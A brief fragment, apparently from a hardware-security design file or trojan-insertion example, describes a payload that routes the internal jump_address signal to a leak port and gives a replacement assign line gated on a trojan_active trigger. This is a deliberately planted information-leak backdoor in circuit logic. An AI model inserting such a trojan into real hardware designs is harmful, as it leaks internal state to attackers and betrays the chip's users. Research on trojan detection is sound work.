 ...
 * Payload: Route jump_address to leak port
 * 
...
// ============================================================
// Information Leak: Route jump_address to unused output
//
...
//   Replace: assign output_signal = trojan_active ? jump_address : normal_value;